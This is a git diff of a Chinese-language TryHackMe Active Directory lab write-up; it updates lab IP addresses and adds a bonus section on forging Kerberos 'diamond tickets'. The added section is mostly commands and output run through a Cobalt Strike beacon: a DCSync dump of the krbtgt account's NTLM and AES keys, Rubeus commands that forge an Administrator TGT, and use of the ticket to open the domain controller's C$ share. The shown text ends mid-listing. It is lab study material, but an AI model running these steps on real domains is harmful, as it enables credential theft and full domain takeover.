@@ -37,11 +37,11 @@ systemctl restart systemd-resolved
 ```
 ┌──(root💀kali)-[~]
 └─# nslookup thmdc.za.tryhackme.loc
-Server:         10.200.83.101
-Address:        10.200.83.101#53
+Server:         10.200.88.101
+Address:        10.200.88.101#53
 
 Name:   thmdc.za.tryhackme.loc
-Address: 10.200.83.101
+Address: 10.200.88.101
 
 ```
 
@@ -467,4 +467,393 @@ d-----         7/3/2022   9:51 AM                Windows
 > What tab is used to modify the security permissions that users and groups have on the GPO?
 
 > Delegation 
+
+# 加餐
+
+## 钻票一
+
+查看域用户名和sid
+
+```
+beacon> powershell Get-NetUser |select cn,objectsid
+[*] Tasked beacon to run: Get-NetUser |select cn,objectsid
+[+] host called home, sent: 357 bytes
+[+] received output:
+#< CLIXML
+
+cn                 objectsid                                     
+--                 ---------                                     
+Administrator      S-1-5-21-3885271727-2693558621-2658995185-500 
+Guest              S-1-5-21-3885271727-2693558621-2658995185-501 
+vagrant            S-1-5-21-3885271727-2693558621-2658995185-1000
+krbtgt             S-1-5-21-3885271727-2693558621-2658995185-502 
+```
+
+
+导出krbtgt哈希
+```
+beacon> dcsync za.tryhackme.loc za\krbtgt
+[*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:za.tryhackme.loc /user:za\krbtgt command
+[+] host called home, sent: 296050 bytes
+[+] received output:
+[DC] 'za.tryhackme.loc' will be the domain
+[DC] 'THMDC.za.tryhackme.loc' will be the DC server
+[DC] 'za\krbtgt' will be the user account
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010202 ( ACCOUNTDISABLE NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   : 
+Password last change : 4/25/2022 7:18:22 PM
+Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 16f9af38fca3ada405386b3b57366082
+    ntlm- 0: 16f9af38fca3ada405386b3b57366082
+    lm  - 0: 35c7b671efe40860dc078afd2786c902
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 4bf7050f5f09f6d59a8699081d9ed432
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : ZA.TRYHACKME.LOCkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 9b52d4ffae227e50025574e4347783ee4f4f6c01c110b1ad4c715d0c977558ca
+      aes128_hmac       (4096) : c893fd72ddf7fe2ee545f52b8368602f
+      des_cbc_md5       (4096) : d904d37f8ab6fed6
+
+* Primary:Kerberos *
+    Default Salt : ZA.TRYHACKME.LOCkrbtgt
+    Credentials
+      des_cbc_md5       : d904d37f8ab6fed6
+
+* Packages *
+    NTLM-Strong-NTOWF
+```
+
+查看域用户名和sid
+```
+beacon> powershell Get-NetGroup |select cn,objectsid
+[*] Tasked beacon to run: Get-NetGroup |select cn,objectsid
+[+] host called home, sent: 361 bytes
+[+] received output:
+#< CLIXML
+
+
+
+cn                                      objectsid                                     
+
+--                                      ---------                                     
+
+Administrators                          S-1-5-32-544                                                              
+Domain Computers                        S-1-5-21-3885271727-2693558621-2658995185-515 
+Domain Controllers                      S-1-5-21-3885271727-2693558621-2658995185-516 
+Cert Publishers                         S-1-5-21-3885271727-2693558621-2658995185-517 
+Domain Admins                           S-1-5-21-3885271727-2693558621-2658995185-512 
+Domain Users                            S-1-5-21-3885271727-2693558621-2658995185-513 
+Domain Guests                           S-1-5-21-3885271727-2693558621-2658995185-514 
+```
+
+
+使用rebeus制作钻票，krbkey是krbtgt的aes256 哈希
+
+这里注意Rubeus要用最新版本，github上release那个是旧的，需要下载master的源码自己编译debug版本
+
+```
+beacon> execute-assembly tools/Rubeus2.1/Rubeus/bin/Debug/Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:9b52d4ffae227e50025574e4347783ee4f4f6c01c110b1ad4c715d0c977558ca /nowrap
+[*] Tasked beacon to run .NET program: Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:9b52d4ffae227e50025574e4347783ee4f4f6c01c110b1ad4c715d0c977558ca /nowrap
+[+] host called home, sent: 585567 bytes
+[+] received output:
+
+
+   ______        _                      
+
+  (_____ \      | |                     
+
+   _____) )_   _| |__  _____ _   _  ___ 
+
+  |  __  /| | | |  _ \| ___ | | | |/___)
+
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+
+  |_|   |_|____/|____/|_____)____/(___/
+
+
+
+  v2.1.2 
+
+
+
+[*] Action: Diamond Ticket
+
+....
+[*] base64(ticket.kirbi):
+
+
+
+      doIFTjCCBUqgAwIBBaEDAgEWooIERTCCBEFhggQ9MIIEOaADAgEFoRIbEFpBLlRSWUhBQ0tNRS5MT0OiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEFpBLlRSWUhBQ0tNRS5MT0OjggP1MIID8aADAgESoQMCAQKiggPjBIID35Kwr9WjtyWSGOeHcWSuoQE2BcfzwFHam6erIX+0MEtxpM/L9/nLVFjTtsFDjiiQQNCmFfUIYot2GLoizhx4ypbOuoEaoGYv838SwHF0X0gBLz5xdI6a5sCgY2C6b4Zt1AHad+On/HyN+TObl+DN84GImrP7pvSgsDbHnKFrbJVIR/Lmqf+aidvq+iLQAGh9WCzCaB65HAjWkHE5NKoHeWyqS6LSFAV5y98ArSzDTD2TR/GdIhv2HUivEyferLsElIh/0WJSS7IDIgBp1SduPl8gAMFXIWeMFdwbo1f7sVATlSRtkY+fJAaW6N+u2FHS2RdHYS7Y6MLgsRIGOb/SYBqtQ5LAixNkDbFTwAD+obBXwhKXkNAe6x48T/9kQ4L19VDg1fGl0d0thp5xBEKj+YAJgSUHgBqDKOx2JMBee+AYanI2GXDtiQmWBHg59CY35fYtaWA6HqpHuwuNcGW3A84S8mJXZi6cDIYn9npkdC8/LDNuqEApUaQCawj1RQPrZu7y0J3zh0PW362hSbukhMsk688WlPImXTqJeyXin6+Mx5atAjB+jPnljl3Ka9WEBTVDm/k0HR16NSeXouc6CTg9bRGQRPgi94Z1GtmsciGSt+MlCmA6SFJLFmpmk90segjyPZCfVkA0cTCD3UdRGiIISUWOfG0gpUz1Ce2cajZOCwb1fNp/P0/KZFSBu28cQtZAIoI/PztuE34nx8OpgUkU/TK9+5H/3F3XA97hAnRGoacoUTgCMbC90huUFmlXMV/dGiQzlxXfav8vBsbylO0kigpeN9uez9WJ6Fav4FM9MwqnN8wx5hobUF0ve/jyX+0wJAMYu9NVvNUKMTzeuGBInhCdXY+uQjs1+pds+SWsZZi1YM2yNhSAjurjDl13osLTg4cdm90nFxRPYxXLBEpfO9/KzJamszfjyNw5VjbCWSdCDCmEonf7+XyHOo3FVtapaHRcZFRJLABt6dIRT6T/SktvbEg/dH/4Ff9Cx1WHXFkOvGI2w5wt2K0Va4WXPoWYhvUMY1Tz8YNXu90OZRhlpq/JMSIxiuY/3xSCC549CnRrNojvbIVfFItXTBDpdD+2lK3nviIwK5m5OErlYchorw5A9peHA/HPwUB0lI4C7+/NEDhy5FyYKX9gyARmmu6r9tkvOe0J1ORJzwomkt6LWT32pQkkP0CrqP21ow9uykV/hBrbygfMrRM4/I+nNFwYQ6T9wl7mft9ZG8jzLp8BiK7H2P01U+L2aUKwbae+WnBZ13MB+/9XfPr0LjAQjRnrUFBDRYHZqqpVGf8O0wpzRnKHtuy6Dx6hKqxNN0ujgfQwgfGgAwIBAKKB6QSB5n2B4zCB4KCB3TCB2jCB16ArMCmgAwIBEqEiBCDUia9yKd/GdaJsqBvQd011Fyk1NXA/eypqUCgJtF1ocKESGxBaQS5UUllIQUNLTUUuTE9DohcwFaADAgEBoQ4wDBsKbG91aXMuY29sZaMHAwUAYKEAAKURGA8yMDIyMDgyMjAzMjExOVqmERgPMjAyMjA4MjIxMjM5NDhapxEYDzIwMjIwODI5MDIzOTQ4WqgSGxBaQS5UUllIQUNLTUUuTE9DqSUwI6ADAgECoRwwGhsGa3JidGd0GxBaQS5UUllIQUNLTUUuTE9D
+
+
+
+[*] Decrypting TGT
+
+
+[+] received output:
+[*] Retreiving PAC
+
+[*] Modifying PAC
+
+[*] Signing PAC
+
+[*] Encrypting Modified TGT
+
+
+
+[*] base64(ticket.kirbi):
+
+
+
+      doIFZDCCBWCgAwIBBaEDAgEWooIEWDCCBFRhggRQMIIETKADAgEFoRIbEFpBLlRSWUhBQ0tNRS5MT0OiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEFpBLlRSWUhBQ0tNRS5MT0OjggQIMIIEBKADAgESoQMCAQOiggP2BIID8ikk839hlWDGstm4Y0BhB3LG2S5oUX6/brYnYqaAVDQUYYf9ciBXng4ioiCN2xUFRw6RInvRgt5fj0SDss+tOsRWuFjdzwIexLUMC1LHYu9jD9p/OKzJvIhd8YV57Z1llZjkiJnDsGqd5Xzwyfg16OwqaAlUeGrAlwmrElur/gL7kXMpQuvlCnWAm94nQDb1MQltn7gVvk2h4nl0gSWeeJ+8moV0WnYnuMOFhGbo3PcF3fcckWgAsf6M6bmWwNM+pUmvW2HuTwyvIz5OfIJlwSmmEie65UMLHqErYiq7WEfZgzz9j1DG89SAD1jRaN1kubBrkfgF0yELcdu0Rs/noxFPYqzYv/dKlv0chm0XMwK/5b7QG6BLttgKqcqnV24rLRsuVlMFdfgNmtZLh177ySNq22wa9URD8ZBKJH7nCxS7BHOrWV7iPuCXHr1DI2l6sSsyx4wZgnQq3kaSwAl226ofVcRwKlw3UF371/jGIMgB2KG/LT0qEN5etlKzycI4nATCma9aSRZ3LyW0Fu3xfacuT6L5dqxKA85ZAxzAbmD7Q7LgY17ZDHhqhdVPaLqjC4x1KcaIxsUYRrRYjggKT2Dqhj/YxOAXXrv1JWqW66hnie8nQr/bz0gA8qhBVjD4D1gihLH5P7HPcvkL20zqfTAt6GDgYIUc1WnPql6hxgrmpN43ihtK6bwezW/H2xLiFyQqyGG+Xy/RMrTDXfaA6Q9WT7iCFK8uPbRFGUHr3fzIV4R0etyzPyrXpovlAV1BjeHbCMIZvlrBLKb3fj0yfqNX1gAwaa03i3YNZtx+cwjDJoazkOFGTqf08G/4pdMcRr5bfAGYq/UAcAqhBODtrPATpOa5HVwQEQ3JWQ2U04139c0M9BtQUTIRKu5v6hBFF6vqhl2AuN9Pnvv7fKbGOy9VKvYB5ZbWCAkbIS8QgtWXSicQKopny2vqwLGUKx/LuxNYL2nvFmD1YW1tko2uK+5uw5ZVnKlGul2RvO/ihRQJP1Ce3wyhXeJ0Kw2iwnN0ERufW2lhROzysqj+QgW6fl/IixVwcO2Sorm3N+OwHPv32SpCIkk7eIXrlMx5ZVrbR6kLOkCRBYHsK4TqPuFEqVDYAGom0NdkiaJ74uvyTjgyZToSbddqzi8EN7fKZEjD6EOwF48PFl6Hj9aXWSoNQGPqSdzBEact/ejBofZNvJXbTSVGq5/dH2yfIsM8wTfWwDIaazAogXcExGdAljM3ckkPzL4goXRS3QEgoKMSIvE1+uaRiYE5arY/PhhS0FqRDCJkt+rRMpxHXher90NLysJ1SSqdNJR9kO+UI7iAeIv8n6zojot+e4aimEqIA8kBghDEo4H3MIH0oAMCAQCigewEgel9geYwgeOggeAwgd0wgdqgKzApoAMCARKhIgQg1ImvcinfxnWibKgb0HdNdRcpNTVwP3sqalAoCbRdaHChEhsQWkEuVFJZSEFDS01FLkxPQ6IaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAGChAAClERgPMjAyMjA4MjIwMzIxMTlaphEYDzIwMjIwODIyMTIzOTQ4WqcRGA8yMDIyMDgyOTAyMzk0OFqoEhsQWkEuVFJZSEFDS01FLkxPQ6klMCOgAwIBAqEcMBobBmtyYnRndBsQWkEuVFJZSEFDS01FLkxPQw==
+
+
+
+
+
+```
+
+查看tgt描述
+```
+beacon> execute-assembly tools/Rubeus2.1/Rubeus/bin/Debug/Rubeus.exe describe /ticket:doIFZDCCBWCg...FLkxPQw==
+[*] Tasked beacon to run .NET program: Rubeus.exe describe /ticket:doIFZDCCBWCg...FLkxPQw==
+[+] host called home, sent: 588989 bytes
+[+] received output:
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.2 
+
+
+[*] Action: Describe Ticket
+
+
+  ServiceName              :  krbtgt/ZA.TRYHACKME.LOC
+  ServiceRealm             :  ZA.TRYHACKME.LOC
+  UserName                 :  Administrator
+  UserRealm                :  ZA.TRYHACKME.LOC
+  StartTime                :  8/22/2022 4:21:19 AM
+  EndTime                  :  8/22/2022 1:39:48 PM
+  RenewTill                :  8/29/2022 3:39:48 AM
+  Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  1ImvcinfxnWibKgb0HdNdRcpNTVwP3sqalAoCbRdaHA=
+
+```
+
+制作成票据
+```
+[IO.File]::WriteAllBytes("C:\Users\max\desktop\diamond.kirbi", [Convert]::FromBase64String("doIFZDCCBWCgAwIBBaEDAgEWooIEWDCCBFRhggRQMIIETKADAgEFoRIbEFpBLlRSWUhBQ0tNRS5MT0OiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEFpBLlRSWUhBQ0tNRS5MT0OjggQIMIIEBKADAgESoQMCAQOiggP2BIID8ikk839hlWDGstm4Y0BhB3LG2S5oUX6/brYnYqaAVDQUYYf9ciBXng4ioiCN2xUFRw6RInvRgt5fj0SDss+tOsRWuFjdzwIexLUMC1LHYu9jD9p/OKzJvIhd8YV57Z1llZjkiJnDsGqd5Xzwyfg16OwqaAlUeGrAlwmrElur/gL7kXMpQuvlCnWAm94nQDb1MQltn7gVvk2h4nl0gSWeeJ+8moV0WnYnuMOFhGbo3PcF3fcckWgAsf6M6bmWwNM+pUmvW2HuTwyvIz5OfIJlwSmmEie65UMLHqErYiq7WEfZgzz9j1DG89SAD1jRaN1kubBrkfgF0yELcdu0Rs/noxFPYqzYv/dKlv0chm0XMwK/5b7QG6BLttgKqcqnV24rLRsuVlMFdfgNmtZLh177ySNq22wa9URD8ZBKJH7nCxS7BHOrWV7iPuCXHr1DI2l6sSsyx4wZgnQq3kaSwAl226ofVcRwKlw3UF371/jGIMgB2KG/LT0qEN5etlKzycI4nATCma9aSRZ3LyW0Fu3xfacuT6L5dqxKA85ZAxzAbmD7Q7LgY17ZDHhqhdVPaLqjC4x1KcaIxsUYRrRYjggKT2Dqhj/YxOAXXrv1JWqW66hnie8nQr/bz0gA8qhBVjD4D1gihLH5P7HPcvkL20zqfTAt6GDgYIUc1WnPql6hxgrmpN43ihtK6bwezW/H2xLiFyQqyGG+Xy/RMrTDXfaA6Q9WT7iCFK8uPbRFGUHr3fzIV4R0etyzPyrXpovlAV1BjeHbCMIZvlrBLKb3fj0yfqNX1gAwaa03i3YNZtx+cwjDJoazkOFGTqf08G/4pdMcRr5bfAGYq/UAcAqhBODtrPATpOa5HVwQEQ3JWQ2U04139c0M9BtQUTIRKu5v6hBFF6vqhl2AuN9Pnvv7fKbGOy9VKvYB5ZbWCAkbIS8QgtWXSicQKopny2vqwLGUKx/LuxNYL2nvFmD1YW1tko2uK+5uw5ZVnKlGul2RvO/ihRQJP1Ce3wyhXeJ0Kw2iwnN0ERufW2lhROzysqj+QgW6fl/IixVwcO2Sorm3N+OwHPv32SpCIkk7eIXrlMx5ZVrbR6kLOkCRBYHsK4TqPuFEqVDYAGom0NdkiaJ74uvyTjgyZToSbddqzi8EN7fKZEjD6EOwF48PFl6Hj9aXWSoNQGPqSdzBEact/ejBofZNvJXbTSVGq5/dH2yfIsM8wTfWwDIaazAogXcExGdAljM3ckkPzL4goXRS3QEgoKMSIvE1+uaRiYE5arY/PhhS0FqRDCJkt+rRMpxHXher90NLysJ1SSqdNJR9kO+UI7iAeIv8n6zojot+e4aimEqIA8kBghDEo4H3MIH0oAMCAQCigewEgel9geYwgeOggeAwgd0wgdqgKzApoAMCARKhIgQg1ImvcinfxnWibKgb0HdNdRcpNTVwP3sqalAoCbRdaHChEhsQWkEuVFJZSEFDS01FLkxPQ6IaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAGChAAClERgPMjAyMjA4MjIwMzIxMTlaphEYDzIwMjIwODIyMTIzOTQ4WqcRGA8yMDIyMDgyOTAyMzk0OFqoEhsQWkEuVFJZSEFDS01FLkxPQ6klMCOgAwIBAqEcMBobBmtyYnRndBsQWkEuVFJZSEFDS01FLkxPQw=="))
+```
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661139561613.jpg)
+
+
+导入票据,访问DC
+```
+beacon> getuid
+[*] Tasked beacon to get userid
+[+] host called home, sent: 8 bytes
+[*] You are ZA\louis.cole
+beacon> ls \\thmdc.za.tryhackme.loc\c$
+[*] Tasked beacon to list files in \\thmdc.za.tryhackme.loc\c$
+[+] host called home, sent: 45 bytes
+[-] could not open \\thmdc.za.tryhackme.loc\c$\*: 5
+beacon> make_token za\Administrator FakePass
+[*] Tasked beacon to create a token for za\Administrator
+[+] host called home, sent: 43 bytes
+[+] Impersonated ZA\louis.cole
+beacon> kerberos_ticket_use tgt/diamond.kirbi
+[*] Tasked beacon to apply ticket in /root/CobaltStrike/tgt/diamond.kirbi
+[+] host called home, sent: 2946 bytes
+beacon> ls \\thmdc.za.tryhackme.loc\c$
+[*] Tasked beacon to list files in \\thmdc.za.tryhackme.loc\c$
+[+] host called home, sent: 45 bytes
+[*] Listing: \\thmdc.za.tryhackme.loc\c$\
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     04/25/2022 19:06:39   $Recycle.Bin
+          dir     03/21/2020 20:49:34   Boot
+          dir     03/21/2020 20:25:04   Documents and Settings
+          dir     09/15/2018 08:19:00   PerfLogs
+          dir     05/11/2022 10:32:07   Program Files
+          dir     03/21/2020 20:28:23   Program Files (x86)
+          dir     07/03/2022 09:56:24   ProgramData
+          dir     04/25/2022 19:06:08   Recovery
+          dir     04/25/2022 19:16:18   System Volume Information
+          dir     07/06/2022 16:38:29   tmp
+          dir     06/30/2022 14:58:06   Tools
+          dir     04/27/2022 08:22:16   Users
+          dir     04/25/2022 19:11:03   vagrant
+          dir     07/03/2022 09:51:24   Windows
+ 399kb    fil     03/21/2020 20:38:26   bootmgr
+ 1b       fil     09/15/2018 08:12:30   BOOTNXT
+ 8kb      fil     03/22/2020 04:23:43   BOOTSECT.BAK
+ 103b     fil     01/04/2022 07:47:26   delete-vagrant-user.ps1
+ 169b     fil     05/01/2022 09:11:47   dns_entries.csv
+ 448mb    fil     08/22/2022 03:34:31   pagefile.sys
+ 7kb      fil     07/03/2022 18:05:43   shell.exe
+ 1kb      fil     05/01/2022 09:17:19   thm-network-setup-dc.ps1
+```
+
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661138983458.jpg)
+
+## 钻票二
+
+假如Rubeus.exe无法使用/tgtdeleg参数，依然可以使用下面方法制作钻票，参考[这里](https://github.com/GhostPack/Rubeus#diamond)
+
+```
+beacon> execute-assembly tools/Rubeus2.1/Rubeus/bin/Debug/Rubeus.exe diamond /user:louis.cole /password:Password! /enctype:aes /domain:za.tryhackme.loc /dc:THMDC.za.tryhackme.loc /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:9b52d4ffae227e50025574e4347783ee4f4f6c01c110b1ad4c715d0c977558ca /nowrap
+[*] Tasked beacon to run .NET program: Rubeus.exe diamond /user:louis.cole /password:Password! /enctype:aes /domain:za.tryhackme.loc /dc:THMDC.za.tryhackme.loc /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:9b52d4ffae227e50025574e4347783ee4f4f6c01c110b1ad4c715d0c977558ca /nowrap
+[+] host called home, sent: 585751 bytes
+[+] received output:
+
+
+   ______        _                      
+
+  (_____ \      | |                     
+
+   _____) )_   _| |__  _____ _   _  ___ 
+
+  |  __  /| | | |  _ \| ___ | | | |/___)
+
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+
+  |_|   |_|____/|____/|_____)____/(___/
+
+
+
+  v2.1.2 
+
+
+
+[*] Action: Diamond Ticket
+
+
+
+[*] Using domain controller: THMDC.za.tryhackme.loc (10.200.88.101)
+
+[!] Pre-Authentication required!
+
+[!] AES256 Salt: ZA.TRYHACKME.LOClouis.cole
+
+[*] Using aes256_cts_hmac_sha1 hash: C069BADC39BA1027C18B4833B4C25491F298A79E99EB227D44D0617B84A0B534
+
+[*] Building AS-REQ (w/ preauth) for: 'za.tryhackme.loc\louis.cole'
+
+[*] Using domain controller: 10.200.88.101:88
+
+[+] TGT request successful!
+
+[*] base64(ticket.kirbi):
+
+
+
+      doIFTjCCBUqgAwIBBaEDAgEWooIERTCCBEFhggQ9MIIEOaADAgEFoRIbEFpBLlRSWUhBQ0tNRS5MT0OiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEFpBLlRSWUhBQ0tNRS5MT0OjggP1MIID8aADAgESoQMCAQKiggPjBIID3zux1CH4nmKXd6aa9nueXCD7/jOXbP5aJ9IyHwaB2d/Zm4bvBCbHBnpThzsChr4QCYmIrk7O/PnmjbMxFHXxF7fUvWTc8gP81mIzFg5iXfHuMhoHQHhOooJrj3llVcHGziGnUMuJWGY7hFlSU58KnKIR09MEZTdWALeCYXTkaVyo4VX0uA4NsyOBHTZnj8NnQH4VAhpkeZJeySmgH1IfgBnXANKy0QU6smSq/4D854DcqPfDWQc7uHf1h0WKr/WPr9ueVtI27EcdH/Fa5Uq0UEJY84q7GJQguajhhdIuCPMoU2NURJXmpM6GPRpsAHsceVTpO5KonBtDp40lOjIPbuA2JPNV1gp1p3GG23W3ESHFfZOq9s1wFUDjyo03DRukQ8/cSqOxep1ynQbdA2f/8OmWqRXysRyDXVdZOfaXFM0XsD2wT1lHKb2hljQAyMIyINnKMt2je5xGeysjGEK+TIRvCN8ed0ZfZq7E9yoxfcyrr8MNXgWDL9hpZH1KtDfIohbJHUMXOjvkhvDZIA2hSqzwDBKa6+oGPMITz1BEZu6cqZH504j+dCKzDro2kjJ6peRviUNGq/11AzEuVjgfKG6nj601r2w/NPXMsQE9JwuG9+/QQaG9QuP3nAHi3t3ds9BtaCcrW1V73iP3rxk88mAILleSLcJAIEVrn6bYgHHX9qEWGCqGJnM0sratC9QC8cjeqaIFCd7Q+JE/6H9BROJGUkzH3r5tE4JvkX+9oFsmMBXyyHR2Z/EgIczp3LZwLp0VzlaTBKTb2Ys9aZo6RCjTqM1CJS+P4XVq79oH7YDHOP63t6uXth+BG8Qly4X8mbEYq3j70EEpSMrCuncgOLBUpeouxIZ2mONTYV4N7zrO1yRw2vrmleZdQuUPiS0FrdOUmTA+vQshDcHid8gYZDTMbSlyLqPJcqFDr8pUNG6E5d+pB4XTpsBFcT63Z6/TelTjfrfLCo7A55VKReSam9ZK492w3U9liYnazGaE+71SaBypTBNDLz/AwExBPqOXdz/sbUwVVWySZUsImtk/Hpb/3GZw3MYpGQWBHvFoQUPtGLkPu7uVXcgxxjsRLIUFWdHFN6EW4Lk3+vSisbHLNECDtTy6jxiTGxhSQPvWIDaxeZl0Ux0fezLCXWc55xikI8gWj8Hi/RvTao70GzzQ7Y5r2rVnEp1OnoXQRCi5ELXuXk6cr850v6vuDpipQLusgUe80H8Rc9Y76tLRad1ADqYg1AZiZz0S/4nDrIq76B/fAau5R447CWZCv5TnXH/4jnEOyr3ljrsXP8DYyNoviY9BPnNgUu1wYRiQ0CZBna6jgfQwgfGgAwIBAKKB6QSB5n2B4zCB4KCB3TCB2jCB16ArMCmgAwIBEqEiBCB0+ieL5w46U+fGRgJgeFsHKelmjh/ZY+VeEeHOUP9RpKESGxBaQS5UUllIQUNLTUUuTE9DohcwFaADAgEBoQ4wDBsKbG91aXMuY29sZaMHAwUAQOEAAKURGA8yMDIyMDgyMjAzNDM1NVqmERgPMjAyMjA4MjIxMzQzNTVapxEYDzIwMjIwODI5MDM0MzU1WqgSGxBaQS5UUllIQUNLTUUuTE9DqSUwI6ADAgECoRwwGhsGa3JidGd0GxBaQS5UUllIQUNLTUUuTE9D
+
+
+
+[*] Decrypting TGT
+
+[*] Retreiving PAC
+
+[*] Modifying PAC
+
+[*] Signing PAC
+
+[*] Encrypting Modified TGT
+
+
+
+[*] base64(ticket.kirbi):
+
+
+
+      doIFZDCCBWCgAwIBBaEDAgEWooIEWDCCBFRhggRQMIIETKADAgEFoRIbEFpBLlRSWUhBQ0tNRS5MT0OiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEFpBLlRSWUhBQ0tNRS5MT0OjggQIMIIEBKADAgESoQMCAQOiggP2BIID8la2r3lV5Ac9hTArhYupe9GrXXoC1I3drRM0COJvgPTiyAgw054SHKtFzXNO5pH0qBYQ6RQMqqwE1mFqnkKg1Vf0EAhfU/sNsb7VGRtVjKTqAqhMsuRfcXoEhip1zdaI68aejrjXq2kyvXmryMGEtRhRaxjsI+OUFhMl+n29ggRW3e2xOtsTc7aeBK05cPz4dMb/7BTxuu5f56nNCLETY0cLD/vjXqCgeKCQI1tixq4Hs3zTVK0LSKYW5gK5+F01mehgdbDxjp9XER3femUOUmSn5za6lb0DFRCPwB+fVoLg6n/cMP9pDMnc8C2A5FY5R1zErTFOcR03yJYaz8oe490x6DUBS23QkJbhergrCtWXCSybvjSAXg6kEQTKDnsBb+5mAWynjP67oK2/hsgJbbQhypnHrldHwLu0LKbHDXdZtuobkiFgtEJdn9W36Yg/6ptll4WlMrX2C7CHHLPngR3j6alSCZN1pZ9Fa8MYIwefsjZrfQK82QtjC/Adl4J9/dtmzvHVmhAxiCJOOs8ZZy4M0I35rXeOG1uv/14gGzWcFQwdZOUvvu2y+XCs7NEpCzkYRJv3XSjeh5ZkdU22pdMcsvHnuTRthtT1J4ZK9xfmLi/pfpBELry3XY/WKS2sNxs1/cM8Ph9PfXJrQltpeg7i0dqiOO8HVwr/jIXC+AfS39NnqodZEUYOhz4hTUXYHah/4otSj5CHPuTwW+YOhQR6DDymS0HnlmO1ygOK+nODeEjRVwpKLICi6KtqB8yHZSYZg2TROIU64aO71mrgO3RfZGiuTEkpnUJm5jwtvCC1QFhCtM76YwMvt3S3DYykTVcQKtT+IPZn7ZKnNnj5oEPVj8/XynWIYxpnAR+hAAbDBJK6u9KEBvxx2Cvzcw+O52SEjuehbW0OZKcugGL3+TLRBw1iBUt1IsHu98YCZO7plWChvkw/YUx0RwweNd5NAtjo7axv3lHQhOHQB+MJM96JZ0x2q8gedA5lF5JmxLuSY+00q5x8qf6ls4eiWBgoSaF9xW/Oa38hfQ0l6w1ZpdVnWTLmLtt+Gokt3RszX4HW7WCirciURt59uWs3QCGx80qDp35t5VDUSsN+TEbEnfpJepO5z2zj+HG/HN4AZf6tlZ4Tjm1QFzVA4MO9HF/xUtIYL1AdoH+u/EX9+vBUFeIKaS1XN8UbwVQW4S2MZjmis8EkixUt18Epn1UsXiVOwzU+YqHAkhf1L5gJ6eoVjnoqfeodA/2JXMdbmLklqUMp4tplTDlxYVeDkx1PVsjXGH+ROH/mMLjmjFAuRTMIYQpQe8J/CzCeQHt6trCyPUjSj+Lq4UnkWeDZFdoNQzMrtXcKo4H3MIH0oAMCAQCigewEgel9geYwgeOggeAwgd0wgdqgKzApoAMCARKhIgQgdPoni+cOOlPnxkYCYHhbBynpZo4f2WPlXhHhzlD/UaShEhsQWkEuVFJZSEFDS01FLkxPQ6IaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEDhAAClERgPMjAyMjA4MjIwMzQzNTVaphEYDzIwMjIwODIyMTM0MzU1WqcRGA8yMDIyMDgyOTAzNDM1NVqoEhsQWkEuVFJZSEFDS01FLkxPQ6klMCOgAwIBAqEcMBobBmtyYnRndBsQWkEuVFJZSEFDS01FLkxPQw==
+
+
+
+```
+
+
+制作票据
+```
+[IO.File]::WriteAllBytes("C:\Users\max\desktop\diamond2.kirbi", [Convert]::FromBase64String("doIF...LkxPQw=="))
+```
+
+
+导入票据，访问DC
+```
+beacon> getuid
+[*] Tasked beacon to get userid
+[+] host called home, sent: 8 bytes
+[*] You are ZA\louis.cole
+beacon> ls \\thmdc.za.tryhackme.loc\c$
+[*] Tasked beacon to list files in \\thmdc.za.tryhackme.loc\c$
+[+] host called home, sent: 45 bytes
+[-] could not open \\thmdc.za.tryhackme.loc\c$\*: 5
+beacon> make_token za\Administrator FakePass
+[*] Tasked beacon to create a token for za\Administrator
+[+] host called home, sent: 43 bytes
+[+] Impersonated ZA\louis.cole
+beacon> kerberos_ticket_use tgt/diamond2.kirbi
+[*] Tasked beacon to apply ticket in /root/CobaltStrike/tgt/diamond2.kirbi
+[+] host called home, sent: 2946 bytes
+beacon> ls \\thmdc.za.tryhackme.loc\c$
+[*] Tasked beacon to list files in \\thmdc.za.tryhackme.loc\c$
+[+] host called home, sent: 45 bytes
+[*] Listing: \\thmdc.za.tryhackme.loc\c$\
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     04/25/2022 19:06:39   $Recycle.Bin
+          dir     03/21/2020 20:49:34   Boot
+          dir     03/21/2020 20:25:04   Documents and Settings
+          dir     09/15/2018 08:19:00   PerfLogs
+          dir     05/11/2022 10:32:07   Program Files
+          dir     03/21/2020 20:28:23   Program Files (x86)
+          dir     07/03/2022 09:56:24   ProgramData
+          dir     04/25/2022 19:06:08   Recovery
+          dir     04/25/2022 19:16:18   System Volume Information
+          dir     07/06/2022 16:38:29   tmp
+          dir     06/30/2022 14:58:06   Tools
